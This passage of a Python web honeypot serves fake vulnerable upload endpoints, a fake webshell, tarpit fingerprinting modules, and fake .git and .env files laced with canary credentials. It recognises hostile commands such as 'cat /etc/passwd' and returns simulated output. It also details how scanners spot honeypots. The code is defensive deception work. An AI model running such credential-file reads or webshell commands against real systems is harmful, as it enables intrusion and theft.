    if cmd.startswith("cat /etc/passwd"):
        return (
            "root:x:0:0:root:/root:/bin/bash\n"
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
            "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
            "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n"
            "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
            "mysql:x:112:116:MySQL Server,,,:/nonexistent:/bin/false\n"
        )
    if first in {"ls", "dir"}:
        return "index.php\nreadme.txt\nwp_filemanager.php\n"
    if cmd in {"w", "who"}:
        return "\n"
    return ""


def render_webshell_page(command: str = "", output: str = "") -> bytes:
    """Minimal but plausible File Manager-ish page. Encourages follow-up POSTs."""
    safe_command = command.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
    safe_output = output.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    html = (
        "<!doctype html>\n"
        "<html><head><title>File Manager</title></head><body>\n"
        "<h2>File Manager</h2>\n"
        "<form method='POST' action=''>\n"
        f"<input type='text' name='cmd' size='80' value='{safe_command}' autofocus />\n"
        "<input type='submit' value='Execute' />\n"
        "</form>\n"
        f"<pre>{safe_output}</pre>\n"
        "</body></html>\n"
    )
    return html.encode("utf-8")


def render_kcfinder_browse_html() -> bytes:
    """Plausible KCFinder file-browser landing page. Two goals: (1) pass
    presence-detection scanners that grep for `KCFinder` / `kcfinder.js`
    in the response body, and (2) carry an `<input type="file" name="upload[]">`
    so the scanner's next move is a multipart POST to `upload.php` — which
    is where we actually capture the payload."""
    return (
        b"<!doctype html>\n"
        b"<html lang=\"en\"><head>\n"
        b"<meta charset=\"utf-8\">\n"
        b"<title>KCFinder File Browser</title>\n"
        b"<link rel=\"stylesheet\" href=\"themes/oxygen/style.css\">\n"
        b"<script src=\"js/kcfinder.js\"></script>\n"
        b"</head>\n"
        b"<body class=\"kcfinder\">\n"
        b"<div id=\"toolbar\">\n"
        b"<button id=\"upload\">Upload</button>\n"
        b"<button id=\"refresh\">Refresh</button>\n"
        b"</div>\n"
        b"<form id=\"upload-form\" method=\"POST\" action=\"upload.php\" enctype=\"multipart/form-data\">\n"
        b"<input type=\"file\" name=\"upload[]\" multiple>\n"
        b"<input type=\"submit\" value=\"Upload\">\n"
        b"</form>\n"
        b"<div id=\"files\"></div>\n"
        b"</body></html>\n"
    )


def render_kcfinder_upload_response(filenames: list[str]) -> bytes:
    """KCFinder's `upload.php` returns one line per uploaded file, with a
    leading `/` for accepted uploads. Real-world scanners parse the first
    character to decide success. We claim success on every part: the next
    request the scanner makes is the actual webshell hit, which lands on
    `/<filename>` (404 in our world) but the multipart body is already
    logged by then."""
    if not filenames:
        return b""
    # Cap how many names we echo back to avoid amplifying an oversized
    # multipart body into an oversized response.
    return ("\n".join(f"/{name}" for name in filenames[:32]) + "\n").encode("utf-8")


def render_jquery_filer_readme() -> bytes:
    """Plausible jquery.filer README — presence-detection scanners fetch
    this exact file before sending the upload POST. Body matches the
    shape of the real README so a content-grep test passes."""
    return (
        b"jQuery.filer\n"
        b"============\n"
        b"\n"
        b"jQuery.filer is a simple HTML5 file uploader, a tool for client-side\n"
        b"file management, with multiple file selection, drag and drop support,\n"
        b"image previews, progress bars and image thumbnails.\n"
        b"\n"
        b"Server-side: php/upload.php (PHP-based form-data handler).\n"
        b"\n"
        b"License: MIT\n"
    )


def render_jquery_filer_upload_response(filenames: list[str]) -> bytes:
    """jquery.filer expects JSON in the shape ``{"OK": 1, "files": [...]}``
    on success. Each file entry mirrors the input filename and reports a
    plausible size + URL so the scanner accepts the upload as complete."""
    if not filenames:
        return b'{"OK":0,"err":"no file","files":[]}\n'
    files = [
        {
            "name": fn,
            "size": secrets.randbelow(900_000) + 1024,
            "type": "application/octet-stream",
            "file": f"./uploads/{fn}",
            "id": secrets.token_hex(8),
        }
        for fn in filenames[:32]
    ]
    return (json.dumps({"OK": 1, "files": files}) + "\n").encode("utf-8")


def render_blueimp_upload_response(filenames: list[str]) -> bytes:
    """Blueimp jQuery-File-Upload server reference implementation returns
    JSON in the shape ``{"files": [{"name": "...", "size": N, "url": "...",
    "thumbnailUrl": "...", "deleteUrl": "...", "deleteType": "DELETE"}, ...]}``.
    On a GET to `server/php/` it lists already-uploaded files; we return
    an empty list so the scanner thinks it found a fresh installation."""
    files = [
        {
            "name": fn,
            "size": secrets.randbelow(900_000) + 1024,
            "type": "application/octet-stream",
            "url": f"server/php/files/{fn}",
            "thumbnailUrl": "",
            "deleteUrl": f"server/php/?file={fn}",
            "deleteType": "DELETE",
        }
        for fn in filenames[:32]
    ]
    return (json.dumps({"files": files}) + "\n").encode("utf-8")


def _parse_chain_params(query: str) -> tuple[str, int]:
    """Extract redirect-chain tracking params from query string."""
    chain_id = ""
    hop = 0
    for part in query.split("&"):
        if "=" not in part:
            continue
        key, _, value = part.partition("=")
        if key == "_hp_chain":
            chain_id = value
        elif key == "_hp_hop":
            try:
                hop = int(value)
            except ValueError:
                pass
    return chain_id, hop


# --- Tarpit module framework ---


class TarpitModule:
    """Base class. Subclass and add to TARPIT_MODULES to activate.

    terminal=True  -> module produces a full aiohttp Response (and logs).
    terminal=False -> module returns (extra_headers, meta) for the caller
                      to merge into the tarpit stream's headers.
    """

    name: str = ""
    terminal: bool = False

    def should_run(self, ctx: dict[str, object]) -> bool:
        return False

    async def run_terminal(self, request: "web.Request", ctx: dict[str, object]) -> "web.Response":
        raise NotImplementedError

    def augment(
        self, request: "web.Request", ctx: dict[str, object]
    ) -> tuple[dict[str, str], dict[str, object]]:
        return {}, {}


class DNSCallbackModule(TarpitModule):
    """Redirect to <uuid>.track-domain to fingerprint DNS resolution."""

    name = "dns-callback"
    terminal = True

    def should_run(self, ctx):
        return MOD_DNS_CALLBACK_ENABLED and MOD_DNS_CALLBACK_DOMAIN

    async def run_terminal(self, request, ctx):
        callback_id = str(uuid.uuid4())
        proto = ctx.get("protocol", "https")
        location = f"{proto}://{callback_id}.{MOD_DNS_CALLBACK_DOMAIN}{ctx['path']}"
        append_log({
            **ctx["log_context"],
            "status": 302,
            "result": "tarpit-module",
            "module": self.name,
            "callbackId": callback_id,
            "location": location,
        })
        return web.Response(
            status=302,
            body=b"redirecting\n",
            headers={
                "Location": location,
                "Content-Type": "text/plain; charset=utf-8",
                "Cache-Control": "no-store",
            },
        )


class CookieTrackingModule(TarpitModule):
    """Set a tracking cookie; detect if scanners return it."""

    name = "cookie-tracking"
    terminal = False

    def should_run(self, ctx):
        return MOD_COOKIE_ENABLED

    def augment(self, request, ctx):
        cookie_header = request.headers.get("Cookie", "")
        returned_tid = ""
        if "_hp_tid=" in cookie_header:
            for part in cookie_header.split(";"):
                part = part.strip()
                if part.startswith("_hp_tid="):
                    returned_tid = part[8:]
                    break
        cookie_id = str(uuid.uuid4())
        headers = {"Set-Cookie": f"_hp_tid={cookie_id}; Path=/; HttpOnly; SameSite=Lax"}
        meta: dict[str, object] = {"cookieId": cookie_id}
        if returned_tid:
            meta["cookieReturned"] = returned_tid
        return headers, meta


class RedirectChainModule(TarpitModule):
    """Start a redirect chain to measure follow-depth."""

    name = "redirect-chain"
    terminal = True

    def should_run(self, ctx):
        if not MOD_REDIRECT_CHAIN_ENABLED:
            return False
        return not ctx.get("query") or "_hp_chain" not in ctx["query"]

    async def run_terminal(self, request, ctx):
        chain_id = str(uuid.uuid4())
        location = f"{ctx['path']}?_hp_chain={chain_id}&_hp_hop=1"
        append_log({
            **ctx["log_context"],
            "status": 302,
            "result": "tarpit-module",
            "module": self.name,
            "chainId": chain_id,
            "hop": 0,
        })
        return web.Response(
            status=302,
            body=b"redirecting\n",
            headers={
                "Location": location,
                "Content-Type": "text/plain; charset=utf-8",
                "Cache-Control": "no-store",
            },
        )


class ContentLengthMismatchModule(TarpitModule):
    """Set a large Content-Length to fingerprint client timeout/validation."""

    name = "content-length-mismatch"
    terminal = False

    def should_run(self, ctx):
        return MOD_CONTENT_LENGTH_MISMATCH_ENABLED

    def augment(self, request, ctx):
        return (
            {"Content-Length": str(MOD_CONTENT_LENGTH_CLAIMED_BYTES)},
            {"claimedBytes": MOD_CONTENT_LENGTH_CLAIMED_BYTES},
        )


class ETagProbeModule(TarpitModule):
    """Set ETag/Last-Modified; detect conditional requests on repeat visits."""

    name = "etag-probe"
    terminal = False

    def should_run(self, ctx):
        return MOD_ETAG_PROBE_ENABLED

    def augment(self, request, ctx):
        request_id = ctx.get("request_id", "")
        etag_value = f'"{request_id}"'
        headers = {"ETag": etag_value, "Last-Modified": "Mon, 01 Jan 2024 00:00:00 GMT"}
        meta: dict[str, object] = {"etag": etag_value}
        if_none_match = request.headers.get("If-None-Match", "")
        if_modified_since = request.headers.get("If-Modified-Since", "")
        if if_none_match:
            meta["conditionalRequest"] = True
            meta["ifNoneMatch"] = if_none_match[:256]
        if if_modified_since:
            meta["conditionalRequest"] = True
            meta["ifModifiedSince"] = if_modified_since[:256]
        return headers, meta


TARPIT_MODULES: list[TarpitModule] = []
if MOD_DNS_CALLBACK_ENABLED and MOD_DNS_CALLBACK_DOMAIN:
    TARPIT_MODULES.append(DNSCallbackModule())
if MOD_REDIRECT_CHAIN_ENABLED:
    TARPIT_MODULES.append(RedirectChainModule())
if MOD_COOKIE_ENABLED:
    TARPIT_MODULES.append(CookieTrackingModule())
if MOD_CONTENT_LENGTH_MISMATCH_ENABLED:
    TARPIT_MODULES.append(ContentLengthMismatchModule())
if MOD_ETAG_PROBE_ENABLED:
    TARPIT_MODULES.append(ETagProbeModule())


def build_tarpit_chunk(request_id: str, path: str, chunk_index: int) -> bytes:
    base = f"TRACEBIT_TARPIT_{chunk_index:06d}={request_id[:8]}:{path}".encode("utf-8", errors="replace")
    if len(base) < TARPIT_CHUNK_BYTES:
        base = base + (b"." * (TARPIT_CHUNK_BYTES - len(base)))
    else:
        base = base[:TARPIT_CHUNK_BYTES]
    return base + b"\n"


# One aiohttp session per process, created on first use. Reusing the session
# pools TCP+TLS connections to Tracebit so rapid cache-miss bursts don't each
# pay the handshake cost.
_http_session: aiohttp.ClientSession | None = None


async def _get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        _http_session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=10),
        )
    return _http_session


async def issue_credentials(
    request_id: str,
    client_ip: str,
    host: str,
    user_agent: str,
    path: str,
    proto: str,
    types: tuple[str, ...] | list[str] | None = None,
) -> dict[str, object]:
    issue_url = f"{API_BASE_URL}/api/v1/credentials/issue-credentials"
    safe_host = re.sub(r"[^0-9a-z._-]+", "-", host or "unknown").strip("-") or "unknown"
    request_name = f"{SENSOR_ID or 'sensor'}-{safe_host}-{datetime.now(UTC).strftime('%Y%m%dT%H%M%SZ')}-{request_id[:8]}"
    payload = {
        "name": request_name,
        "types": list(types) if types else CANARY_TYPES,
        "source": TRACEBIT_SOURCE,
        "sourceType": TRACEBIT_SOURCE_TYPE,
        "labels": [
            {"name": "sensor_id", "value": SENSOR_ID or "unknown"},
            {"name": "host", "value": host or "unknown"},
            {"name": "path", "value": path},
            {"name": "client_ip", "value": client_ip or "unknown"},
            {"name": "request_id", "value": request_id},
            {"name": "protocol", "value": proto or "unknown"},
            {"name": "user_agent", "value": (user_agent or "unknown")[:180]},
        ],
    }
    session = await _get_http_session()
    async with session.post(
        issue_url,
        json=payload,
        headers={
            "Authorization": f"Bearer {API_KEY}",
            "Accept": "application/json",
        },
    ) as response:
        response.raise_for_status()
        result = await response.json()
    _schedule_confirmations(result)
    return result


# Issued canaries don't show up as "active" in the Tracebit dashboard
# until /confirm-credentials is POSTed with their confirmationId — the
# OpenAPI spec is explicit about this. Without it, attackers harvesting
# our /id_rsa, .env, etc. get valid canary creds, but the operator's
# active-key list stays at whatever was confirmed manually. Fire one
# best-effort confirmation per issued canary, in the background, so the
# attacker-facing response isn't slowed by the extra round trip.
_CONFIRM_TASKS: set[asyncio.Task[None]] = set()


def _extract_confirmation_ids(response: object) -> list[str]:
    if not isinstance(response, dict):
        return []
    ids: list[str] = []
    for block_key, id_field in (("aws", "awsConfirmationId"), ("ssh", "sshConfirmationId")):
        block = response.get(block_key)
        if isinstance(block, dict):
            value = block.get(id_field)
            if isinstance(value, str) and value:
                ids.append(value)
    http = response.get("http")
    if isinstance(http, dict):
        for details in http.values():
            if isinstance(details, dict):
                value = details.get("confirmationId")
                if isinstance(value, str) and value:
                    ids.append(value)
    return ids


async def confirm_credential(confirmation_id: str) -> None:
    if not confirmation_id or not API_KEY:
        return
    confirm_url = f"{API_BASE_URL}/api/v1/credentials/confirm-credentials"
    session = await _get_http_session()
    try:
        async with session.post(
            confirm_url,
            json={"id": confirmation_id},
            headers={
                "Authorization": f"Bearer {API_KEY}",
                "Accept": "application/json",
            },
        ) as response:
            response.raise_for_status()
    except (aiohttp.ClientError, asyncio.TimeoutError):
        return


def _schedule_confirmations(response: object) -> None:
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        return
    for confirmation_id in _extract_confirmation_ids(response):
        task = loop.create_task(confirm_credential(confirmation_id))
        _CONFIRM_TASKS.add(task)
        task.add_done_callback(_CONFIRM_TASKS.discard)


def format_env_payload(tracebit_response: dict[str, object]) -> str:
    # Rendered body is served verbatim on /.env; every string here is
    # visible to the attacker. No headers, no "canary"/"tracebit" tells,
    # no error sentinels — an empty upstream response becomes an empty
    # body, which is indistinguishable from an unremarkable empty .env.
    lines: list[str] = []

    aws = tracebit_response.get("aws")
    if isinstance(aws, dict):
        lines.extend(
            [
                f"AWS_ACCESS_KEY_ID={aws.get('awsAccessKeyId', '')}",
                f"AWS_SECRET_ACCESS_KEY={aws.get('awsSecretAccessKey', '')}",
                f"AWS_SESSION_TOKEN={aws.get('awsSessionToken', '')}",
                f"AWS_CREDENTIAL_EXPIRATION={aws.get('awsExpiration', '')}",
            ]
        )

    ssh = tracebit_response.get("ssh")
    if isinstance(ssh, dict):
        lines.extend(
            [
                f"SSH_HOST={ssh.get('sshIp', '')}",
                f"SSH_PRIVATE_KEY_B64={ssh.get('sshPrivateKey', '')}",
                f"SSH_PUBLIC_KEY_B64={ssh.get('sshPublicKey', '')}",
                f"SSH_KEY_EXPIRATION={ssh.get('sshExpiration', '')}",
            ]
        )

    http = tracebit_response.get("http")
    if isinstance(http, dict):
        for canary_type, details in sorted(http.items()):
            if not isinstance(details, dict):
                continue
            env_key = canary_type.upper().replace("-", "_")
            credentials = details.get("credentials")
            if credentials is not None:
                lines.append(f"{env_key}_CREDENTIALS_JSON={json.dumps(credentials, separators=(',', ':'))}")
            host_names = details.get("hostNames")
            if isinstance(host_names, list):
                lines.append(f"{env_key}_HOSTNAMES={','.join(str(value) for value in host_names)}")
            expires_at = details.get("expiresAt")
            if expires_at:
                lines.append(f"{env_key}_EXPIRATION={expires_at}")

    if not lines:
        return ""
    lines.append("")
    return "\n".join(lines)


# --- Fake /.git/ tree builder ---

_FAKE_GIT_LOCK: asyncio.Lock | None = None
_FAKE_GIT_CACHE: dict[str, tuple[float, dict[str, bytes], dict[str, object]]] = {}


def _get_fake_git_lock() -> asyncio.Lock:
    # Must be created inside a running event loop; lazily initialize so the
    # module can be imported outside an async context (tests, etc.).
    global _FAKE_GIT_LOCK
    if _FAKE_GIT_LOCK is None:
        _FAKE_GIT_LOCK = asyncio.Lock()
    return _FAKE_GIT_LOCK


def _git_loose_object(obj_type: bytes, content: bytes) -> tuple[str, bytes]:
    """Return (sha1_hex, zlib-deflated loose object body)."""
    header = obj_type + b" " + str(len(content)).encode("ascii") + b"\x00"
    raw = header + content
    return hashlib.sha1(raw).hexdigest(), zlib.compress(raw)


def _git_tree_entry(mode: str, name: str, sha_hex: str) -> bytes:
    return mode.encode("ascii") + b" " + name.encode("utf-8") + b"\x00" + bytes.fromhex(sha_hex)


# Canonical 14 hook sample names a `git init`-fresh repo ships under
# `.git/hooks/`. Scanners enumerate these as a fingerprint check — a real
# repo always has them, a hand-rolled fake usually does not. A 404 on
# `.git/hooks/pre-commit.sample` against an otherwise-plausible /.git/HEAD
# is a strong "this isn't real" tell, so we serve a non-empty body for
# every name.
_FAKE_GIT_HOOK_NAMES: tuple[str, ...] = (
    "applypatch-msg",
    "commit-msg",
    "fsmonitor-watchman",
    "post-update",
    "pre-applypatch",
    "pre-commit",
    "pre-merge-commit",
    "pre-push",
    "pre-rebase",
    "pre-receive",
    "prepare-commit-msg",
    "push-to-checkout",
    "sendemail-validate",
    "update",
)


def _fake_git_hook_body(name: str) -> bytes:
    """Plausible-shaped `.sample` hook body.

    Deliberately a short generic shell stub rather than git's verbatim
    GPL-licensed template, so we don't redistribute GPL content inside
    Flux. Scanners that hash-match against git's exact bodies will spot
    the difference; the much more common check ("does this file exist
    and look hook-shaped?") still passes.
    """
    return (
        f"#!/bin/sh\n"
        f"#\n"
        f"# An example hook script for `{name}`.\n"
        f"# To enable, rename this file by removing the `.sample` suffix\n"
        f"# and make it executable.\n"
        f"#\n"
        f"# To bypass any hook, pass `--no-verify` to the relevant\n"
        f"# `git` invocation.\n"
        f"\n"
        f"exit 0\n"
    ).encode("utf-8")


def _format_secrets_yaml(tracebit_response: dict[str, object]) -> str:
    aws = tracebit_response.get("aws") if isinstance(tracebit_response, dict) else None
    if not isinstance(aws, dict):
        aws = {}
    lines = [
        "# config/secrets.yml",
        "# Rotated quarterly per INFRA-218.",
        "# Access restricted to prod deploy role; do not share.",
        "production:",
        "  aws:",
        f"    access_key_id: {aws.get('awsAccessKeyId', '')}",
        f"    secret_access_key: {aws.get('awsSecretAccessKey', '')}",
        f"    session_token: {aws.get('awsSessionToken', '')}",
        f"    expiration: {aws.get('awsExpiration', '')}",
        "    region: us-east-1",
        "",
    ]
    return "\n".join(lines)


def _build_fake_git_remote_url(tracebit_response: dict[str, object]) -> str:
    """Build the `url = …` line for the fake /.git/config [remote].

    If FAKE_GIT_REMOTE_URL is set (operator override), use it verbatim.
    Otherwise embed the Tracebit AWS canary as HTTPS Basic userinfo, so a
    scraper that only reads `.git/config` (no clone) still walks away with
    a live canary key. An attacker who extracts the URL and tries the
    access-key/secret as AWS credentials trips the canary; an attacker who
    actually runs `git clone` against the URL fails (the host is not ours)
    but we still catch them via the rest of the fake-git tree.
    """
    if FAKE_GIT_REMOTE_URL:
        return FAKE_GIT_REMOTE_URL
    aws = _aws(tracebit_response)
    access_key = str(aws.get("awsAccessKeyId") or "").strip()
    secret = str(aws.get("awsSecretAccessKey") or "").strip()
    if not access_key or not secret:
        # Canary mint failed or was incomplete; fall back to a static SSH
        # URL (no secret material) rather than emitting a malformed URL.
        return f"git@{FAKE_GIT_REMOTE_HOST}:{FAKE_GIT_REMOTE_PATH}"
    # Percent-encode the secret — base64 can contain '+' / '/' which break
    # URL parsing by downstream tools. quote() with an empty safe set is
    # RFC 3986 userinfo-safe.
    encoded_secret = quote(secret, safe="")
    return f"https://{access_key}:{encoded_secret}@{FAKE_GIT_REMOTE_HOST}/{FAKE_GIT_REMOTE_PATH}"


def _build_fake_repo(
    secrets_body: str,
    tracebit_response: dict[str, object] | None = None,
) -> tuple[dict[str, bytes], dict[str, object]]:
    """Build a loose-object git repo as a path->bytes map.

    Layout: root/{.env.example, README.md, config/secrets.yml}. One commit.
    The canary creds live inside the secrets.yml blob AND (when the Tracebit
    response is provided) inside the `.git/config` remote-origin URL.
    """
    secrets_sha, secrets_blob = _git_loose_object(b"blob", secrets_body.encode("utf-8"))

    readme_body = (
        "# internal-tools\n\n"
        "Shared ops tooling for production deploys.\n\n"
        "## Setup\n\n"
        "1. Copy `.env.example` to `.env`.\n"
        "2. Fill credentials from `config/secrets.yml` (rotated quarterly).\n"
        "3. Run `./bin/deploy prod`.\n"
    )
    readme_sha, readme_blob = _git_loose_object(b"blob", readme_body.encode("utf-8"))

    env_example_body = (
        "# Copy to .env and populate from config/secrets.yml\n"
        "AWS_ACCESS_KEY_ID=\n"
        "AWS_SECRET_ACCESS_KEY=\n"
        "AWS_SESSION_TOKEN=\n"
        "AWS_REGION=us-east-1\n"
    )
    env_example_sha, env_example_blob = _git_loose_object(b"blob", env_example_body.encode("utf-8"))

    # config/ subtree
    config_tree_entries = _git_tree_entry("100644", "secrets.yml", secrets_sha)
    config_tree_sha, config_tree_blob = _git_loose_object(b"tree", config_tree_entries)

    # Root tree. Entries MUST be sorted lexicographically by name.
    # Order: ".env.example" < "README.md" < "config"
    root_tree_entries = (
        _git_tree_entry("100644", ".env.example", env_example_sha)
        + _git_tree_entry("100644", "README.md", readme_sha)
        + _git_tree_entry("40000", "config", config_tree_sha)
    )
    root_tree_sha, root_tree_blob = _git_loose_object(b"tree", root_tree_entries)

    commit_ts = int(time.time()) - 14 * 86400
    commit_body = (
        f"tree {root_tree_sha}\n"
        f"author {FAKE_GIT_AUTHOR} {commit_ts} +0000\n"
        f"committer {FAKE_GIT_AUTHOR} {commit_ts} +0000\n"
        "\n"
        f"{FAKE_GIT_COMMIT_MESSAGE}\n"
    ).encode("utf-8")
    commit_sha, commit_blob = _git_loose_object(b"commit", commit_body)

    def obj_path(sha: str) -> str:
        return f"/.git/objects/{sha[:2]}/{sha[2:]}"

    remote_url = _build_fake_git_remote_url(tracebit_response or {})
    config_text = (
        "[core]\n"
        "\trepositoryformatversion = 0\n"
        "\tfilemode = true\n"
        "\tbare = false\n"
        "\tlogallrefupdates = true\n"
        "[remote \"origin\"]\n"
        f"\turl = {remote_url}\n"
        "\tfetch = +refs/heads/*:refs/remotes/origin/*\n"
        "[branch \"main\"]\n"
        "\tremote = origin\n"
        "\tmerge = refs/heads/main\n"
    )

    reflog_line = (
        f"0000000000000000000000000000000000000000 {commit_sha} "
        f"{FAKE_GIT_AUTHOR} {commit_ts} +0000\tcommit (initial): {FAKE_GIT_COMMIT_MESSAGE}\n"
    )

    # A minimal valid .git/index header: signature "DIRC" + version 2 +
    # entry count 0. Real scanners (git-dumper, gitdumper.sh, etc.) request
    # /.git/index on first contact and treat a 404 there as evidence of a
    # fake repo. Returning zero entries is cheap and convincing: `git
    # ls-files` against the tree just prints nothing.
    git_index_body = b"DIRC" + (2).to_bytes(4, "big") + (0).to_bytes(4, "big") + b"\x00" * 20
    # Keys are lowercased so lookups from extract_git_path() (which returns
    # a lowercased key) match regardless of the case a scanner used on the
    # wire. `/.git/HEAD` on the wire and `/.git/head` on the wire both land
    # on the same response. Real git uses mixed-case filenames on disk, but
    # the on-wire paths are what matter for a dumb-HTTP clone — and no
    # harvester relies on HTTP paths being case-sensitive.
    # FETCH_HEAD shape: `<sha>\t\tbranch '<name>' of <remote>` (note the
    # double-tab — `git fetch` writes an empty middle field for the "for-merge"
    # column when the ref was the requested one).
    fetch_head_remote = (
        FAKE_GIT_REMOTE_URL
        if FAKE_GIT_REMOTE_URL
        else f"git@{FAKE_GIT_REMOTE_HOST}:{FAKE_GIT_REMOTE_PATH}"
    )
    fetch_head_line = f"{commit_sha}\t\tbranch 'main' of {fetch_head_remote}\n"
    files: dict[str, bytes] = {
        "/.git/head": b"ref: refs/heads/main\n",
        "/.git/config": config_text.encode("utf-8"),
        # Some scanners ask for a credential-store file inside the exposed
        # repo metadata rather than the conventional home-directory
        # `/.git-credentials` path. Keep it in the fake repo so dispatch
        # records the request as fake-git while still handing out a GitLab
        # username/password canary.
        "/.git/credentials": render_git_credentials(tracebit_response or {}),
        "/.git/index": git_index_body,
        "/.git/description": b"Unnamed repository; edit this file 'description' to name the repository.\n",
        "/.git/packed-refs": (
            "# pack-refs with: peeled fully-peeled sorted \n"
            f"{commit_sha} refs/heads/main\n"
        ).encode("utf-8"),
        # Plumbing files that ship with any `git init`-fresh repo. Scanners
        # check for these to verify a /.git/ is real — returning 404 on
        # /.git/COMMIT_EDITMSG, /.git/ORIG_HEAD, /.git/FETCH_HEAD against
        # an otherwise-plausible /.git/HEAD is a strong "this is a honeypot"
        # tell. Keys are lowercased to match extract_git_path() output.
        "/.git/commit_editmsg": (FAKE_GIT_COMMIT_MESSAGE + "\n").encode("utf-8"),
        "/.git/orig_head": f"{commit_sha}\n".encode("utf-8"),
        "/.git/fetch_head": fetch_head_line.encode("utf-8"),
        "/.git/refs/heads/main": f"{commit_sha}\n".encode("utf-8"),
        # `master` as a co-located alias for `main`: many repos still have
        # both branches, and scanners enumerate the canonical default-branch
        # names. Pointing master at the same commit costs nothing.
        "/.git/refs/heads/master": f"{commit_sha}\n".encode("utf-8"),
        # Remote-tracking refs — a freshly-cloned repo always has these. The
        # `refs/remotes/origin/HEAD` symbolic ref points at the default
        # branch; the leaf refs hold the same commit as the local branch.
        "/.git/refs/remotes/origin/head": b"ref: refs/remotes/origin/main\n",
        "/.git/refs/remotes/origin/main": f"{commit_sha}\n".encode("utf-8"),
        "/.git/refs/remotes/origin/master": f"{commit_sha}\n".encode("utf-8"),
        "/.git/info/refs": f"{commit_sha}\trefs/heads/main\n".encode("utf-8"),
        "/.git/info/exclude": (
            "# git ls-files --others --exclude-from=.git/info/exclude\n"
            "*.log\n.DS_Store\n"
        ).encode("utf-8"),
        "/.git/logs/head": reflog_line.encode("utf-8"),
        "/.git/logs/refs/heads/main": reflog_line.encode("utf-8"),
        "/.git/logs/refs/heads/master": reflog_line.encode("utf-8"),
        "/.git/logs/refs/remotes/origin/head": reflog_line.encode("utf-8"),
        "/.git/logs/refs/remotes/origin/main": reflog_line.encode("utf-8"),
        "/.git/logs/refs/remotes/origin/master": reflog_line.encode("utf-8"),
        "/.git/objects/info/packs": b"",
        # Loose-object paths are already lowercase (hex). No case fold needed.
        obj_path(commit_sha): commit_blob,
        obj_path(root_tree_sha): root_tree_blob,
        obj_path(config_tree_sha): config_tree_blob,
        obj_path(secrets_sha): secrets_blob,
        obj_path(readme_sha): readme_blob,
        obj_path(env_example_sha): env_example_blob,
    }
    for hook_name in _FAKE_GIT_HOOK_NAMES:
        files[f"/.git/hooks/{hook_name}.sample"] = _fake_git_hook_body(hook_name)
    meta: dict[str, object] = {
        "commitSha": commit_sha,
        "rootTreeSha": root_tree_sha,
        "configTreeSha": config_tree_sha,
        "secretsBlobSha": secrets_sha,
        "readmeBlobSha": readme_sha,
        "envExampleBlobSha": env_example_sha,
    }
    return files, meta


async def _fake_git_get_or_build(
    client_ip: str,
    request_id: str,
    host: str,
    user_agent: str,
    path: str,
    proto: str,
) -> tuple[dict[str, bytes], dict[str, object]] | None:
    """Return cached repo for this IP, or mint a new canary + repo.

    Cache is keyed by client IP with a TTL so objects stay consistent across
    the many requests a git-dumper-style scanner makes within one session.
    """
    now = time.monotonic()
    cache_key = client_ip or f"_anon-{request_id}"
    lock = _get_fake_git_lock()
    async with lock:
        entry = _FAKE_GIT_CACHE.get(cache_key)
        if entry and entry[0] > now:
            return entry[1], entry[2]

    # Release the lock during the network call so a burst of different IPs
    # can issue in parallel; the cache is only guarded for mutation.
    try:
        tracebit_response = await issue_credentials(request_id, client_ip, host, user_agent, path, proto)
    except (aiohttp.ClientError, asyncio.TimeoutError, ValueError):
        return None

    secrets_body = _format_secrets_yaml(tracebit_response)
    files, meta = _build_fake_repo(secrets_body, tracebit_response)
    meta["canaryTypes"] = [key for key, value in tracebit_response.items() if value]

    expiry = now + FAKE_GIT_CACHE_TTL_SECONDS
    async with lock:
        expired = [k for k, v in _FAKE_GIT_CACHE.items() if v[0] <= now]
        for k in expired:
            del _FAKE_GIT_CACHE[k]
        if len(_FAKE_GIT_CACHE) >= FAKE_GIT_CACHE_MAX_ENTRIES:
            oldest_key = min(_FAKE_GIT_CACHE, key=lambda k: _FAKE_GIT_CACHE[k][0])
            del _FAKE_GIT_CACHE[oldest_key]
        _FAKE_GIT_CACHE[cache_key] = (expiry, files, meta)
    return files, meta


# --- Canary-backed file traps ---
#
# Each entry routes a set of exact paths to a render function that embeds
# a freshly-minted Tracebit canary credential into a plausible file format
# (wp-config.php, .aws/credentials, a SQL dump, etc.). Per-IP cache keeps
# repeated scanner fan-out from burning Tracebit quota.

_CANARY_LOCK: asyncio.Lock | None = None
_CANARY_CACHE: dict[tuple[str, tuple[str, ...]], tuple[float, dict[str, object]]] = {}
CANARY_TRAP_CACHE_TTL_SECONDS = max(
    int((os.environ.get("CANARY_TRAP_CACHE_TTL_SECONDS") or "3600").strip() or "3600"), 60,
)
CANARY_TRAP_CACHE_MAX_ENTRIES = max(
    int((os.environ.get("CANARY_TRAP_CACHE_MAX_ENTRIES") or "1024").strip() or "1024"), 16,
)
CANARY_TRAPS_ENABLED = _env_bool("CANARY_TRAPS_ENABLED")


def _get_canary_lock() -> asyncio.Lock:
    global _CANARY_LOCK
    if _CANARY_LOCK is None:
        _CANARY_LOCK = asyncio.Lock()
    return _CANARY_LOCK


async def _get_or_issue_canary(
    types: tuple[str, ...],
    client_ip: str,
    request_id: str,
    host: str,
    user_agent: str,
    path: str,
    proto: str,
) -> dict[str, object] | None:
    """Per-(IP, types) TTL-cached canary issuance.

    A scanner that fans out on the same trap (or different traps needing the
    same canary types) within the TTL gets one canary, not N.
    """
    now = time.monotonic()
    cache_key = (client_ip or f"_anon-{request_id}", types)
    lock = _get_canary_lock()
    async with lock:
        entry = _CANARY_CACHE.get(cache_key)
        if entry and entry[0] > now:
            return entry[1]
    try:
        resp = await issue_credentials(request_id, client_ip, host, user_agent, path, proto, types=types)
    except (aiohttp.ClientError, asyncio.TimeoutError, ValueError):
        return None
    expiry = now + CANARY_TRAP_CACHE_TTL_SECONDS
    async with lock:
        expired = [k for k, v in _CANARY_CACHE.items() if v[0] <= now]
        for k in expired:
            del _CANARY_CACHE[k]
        if len(_CANARY_CACHE) >= CANARY_TRAP_CACHE_MAX_ENTRIES:
            oldest_key = min(_CANARY_CACHE, key=lambda k: _CANARY_CACHE[k][0])
            del _CANARY_CACHE[oldest_key]
